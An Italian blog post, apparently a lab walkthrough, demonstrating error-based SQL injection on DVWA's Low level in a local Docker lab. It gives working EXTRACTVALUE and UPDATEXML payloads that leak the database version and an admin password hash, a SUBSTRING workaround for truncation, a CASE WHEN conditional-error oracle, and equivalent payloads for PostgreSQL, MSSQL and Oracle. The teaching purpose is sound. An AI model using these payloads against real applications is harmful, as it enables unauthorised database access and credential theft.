---
layout: post
title: "Error-based SQL Injection su DVWA Low: far confessare il database nei suoi stessi messaggi di errore"
date: 2026-05-30
categories: [web-security, walkthrough]
tags: [sqli, error-based, dvwa, extractvalue, mariadb]
excerpt: "UNION aveva bisogno di output riflesso. Blind ha richiesto 220 richieste. Error-based ne ha richieste due. Il database ha stampato l'hash completo della password dentro il suo stesso messaggio di errore, e mi sono sentito ingiustificatamente furbo — almeno finché non ho provato Medium."
lang: it
page_id: error-based-sql-injection-dvwa-low
permalink: /posts/sql-injection-error-based-dvwa-low/
---

Le due sessioni precedenti si erano chiuse con dump di credenziali — una tramite UNION SELECT, una tramite 220 round di estrazione blind booleana. UNION aveva bisogno che l'output venisse riflesso in pagina. Blind ha richiesto pazienza e Burp Intruder. Questa sessione parla di una terza tecnica: la **error-based injection**, dove fai generare al database un errore il cui testo contiene il dato che vuoi.

Una richiesta. Il dato dentro il messaggio di errore. Fatto.

La condizione: l'applicazione deve stampare gli errori del database nella risposta. DVWA Low fa esattamente questo — quel `die(mysqli_error(...))` nel codice sorgente non è solo una vulnerabilità, è un canale di esfiltrazione gratuito che lo sviluppatore si è costruito da solo.

## Quando usare quale tecnica

Prima di scegliere uno strumento, devi sapere cosa ti offre l'applicazione:

| Cosa mostra l'app | Tecnica |
|--------------------|-----------|
| Output della query riflesso in pagina | UNION-based |
| Errori del database riflessi in pagina | Error-based |
| Solo differenza comportamentale (esiste/manca) | Blind boolean |
| Niente del tutto | Blind time-based |

L'ordine di selezione in pratica: prova prima UNION, poi error-based, poi ripiega su blind. Ogni gradino più in basso costa più richieste per byte di dato estratto.

## Confermare l'injection — il controllo in tre passi

Prima di tentare qualsiasi estrazione, verifica che l'injection sia possibile e che gli errori siano visibili. Tre richieste:

```
?id=1        → 200, output utente normale         → baseline
?id=1'       → errore di sintassi SQL in pagina    → injection confermata, errori visibili
?id=1'--+    → 200, output normale di nuovo        → controlli la sintassi SQL
```

Il terzo passo è quello che conta: se `--+` neutralizza l'errore, il commento è arrivato al parser SQL. Sei in controllo.

## EXTRACTVALUE: il meccanismo

`EXTRACTVALUE(xml, xpath)` è una funzione MariaDB/MySQL che legge un valore da un documento XML usando un'espressione XPath. Uso legittimo:

```sql
EXTRACTVALUE('<user><name>admin</name></user>', '/user/name')
-- restituisce: admin
```

Il trucco dell'injection: se l'espressione XPath non è valida, il database solleva un errore — e include l'espressione non valida nel messaggio di errore. Quindi se costruisci l'espressione XPath usando una subquery, il database valuta la subquery, prova a usare il risultato come XPath, fallisce, e stampa il risultato nell'errore.

```
?id=1'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+version())))--+
```

Risposta:

```
XPATH syntax error: '~10.1.26-MariaDB-0+deb9u1'
```

La stringa di versione — dentro un messaggio di errore. `0x7e` è `~` in esadecimale, usato come separatore per rendere leggibile l'output. Senza, il dato si mescola col testo dell'errore.

Sostituisci `version()` con qualcosa di più interessante:

```
?id=1'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+password+FROM+users+WHERE+user='admin')))--+
```

Risposta:

```
XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882cf9'
```

Quasi giusto — ma l'hash è di 32 caratteri e ne compaiono solo 31. È un limite noto di `EXTRACTVALUE` su MariaDB: l'output viene troncato a 31 caratteri. Per ottenere l'ultimo carattere, sposta la finestra con `SUBSTRING`:

```
?id=1'+AND+EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT+password+FROM+users+WHERE+user='admin'),31,32)))--+
```

Risposta:

```
XPATH syntax error: '~99'
```

Hash completo: `5f4dcc3b5aa765d61d8327deb882cf99`. Due richieste in totale, contro le 220 che la sessione blind ha richiesto per lo stesso risultato. `UPDATEXML` funziona in modo identico e ha lo stesso limite di 31 caratteri:

```
?id=1'+AND+UPDATEXML(1,CONCAT(0x7e,(SELECT+version())),1)--+
```

## Errori condizionali con CASE WHEN — e la sorpresa di MariaDB

I materiali di PortSwigger descrivono una tecnica in cui inneschi un errore condizionale per creare un oracolo blind: `CASE WHEN (condizione) THEN 1/0 ELSE 1 END`. Se la condizione è vera, la divisione per zero manda in crash il database. Se falsa, restituisce 1 normalmente.

Su PostgreSQL e MSSQL, `1/0` solleva un errore fatale. Su MariaDB:

```
?id=1'+AND+(SELECT+CASE+WHEN+(1=1)+THEN+1/0+ELSE+1+END)--+
```

Nessun errore. Pagina vuota — nessun utente, nessun crash. MariaDB gestisce la divisione per zero silenziosamente, restituendo NULL. L'AND fallisce perché NULL non è truthy, quindi non viene restituita nessuna riga. Poi `1=2` mostra l'utente normalmente.

L'oracolo è invertito rispetto a quello che mi aspettavo: **vuoto = condizione vera, utente visibile = condizione falsa**. Funziona — ma MariaDB non va in crash, restituisce NULL. Bene saperlo prima di dare per scontato un comportamento uniforme tra database diversi.

## Equivalenti error-based tra database diversi

| Database | Funzione | Note |
|----------|----------|-------|
| MySQL / MariaDB | `EXTRACTVALUE(1, CONCAT(0x7e, (payload)))` | Limite di 31 caratteri |
| MySQL / MariaDB | `UPDATEXML(1, CONCAT(0x7e, (payload)), 1)` | Limite di 31 caratteri |
| PostgreSQL | `CAST((payload) AS int)` | Nessun limite di caratteri |
| MSSQL | `CONVERT(int, (payload))` | L'errore include il valore |
| Oracle | `CTXSYS.DRITHSX.SN(1, (payload))` | Richiede privilegi specifici |

Il pattern è lo stesso ovunque: trova una funzione che valuta un'espressione e la include nel messaggio di errore quando fallisce. La funzione specifica cambia, il database resta il complice riluttante.

## Takeaways

- **Error-based è più veloce di blind quando gli errori sono visibili.** Due richieste per estrarre un hash di 32 caratteri contro 220. Una gestione verbosa degli errori è la migliore amica dell'attaccante.
- **Il limite di 31 caratteri in `EXTRACTVALUE` è reale.** Usa `SUBSTRING` per spostare la finestra e recuperare l'output troncato.
- **`CASE WHEN 1/0` si comporta diversamente su MariaDB.** Non va in crash — restituisce NULL. L'oracolo funziona, ma è invertito e il meccanismo è diverso da quello che i lab di PortSwigger descrivono su PostgreSQL.

---

**Due richieste. Dump completo delle credenziali. Il database messo in ginocchio dal suo stesso gestore di errori. A questo punto mi sentivo piuttosto furbo.**

**Quindi sono passato al livello Medium, ho lanciato lo stesso payload, e ha continuato a funzionare perfettamente. Sospettosamente perfettamente.**

**Si è scoperto che ero ancora su Low. La pagina diceva Medium. Il cookie diceva altro.**

*— continua in [Parte 2: livello Medium]({% post_url 2026-05-30-sql-injection-error-based-dvwa-medium %})*

## Riferimenti utili

- [PortSwigger — SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
- [PayloadsAllTheThings — Error-based injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#error-based-injection)
- [MariaDB — EXTRACTVALUE](https://mariadb.com/kb/en/extractvalue/)

---

*Tutte le tecniche mostrate sono state eseguite in un ambiente di laboratorio isolato via Docker sul mio computer locale. Attaccare sistemi che non possiedi o per cui non hai un'autorizzazione scritta è illegale nella maggior parte delle giurisdizioni.*
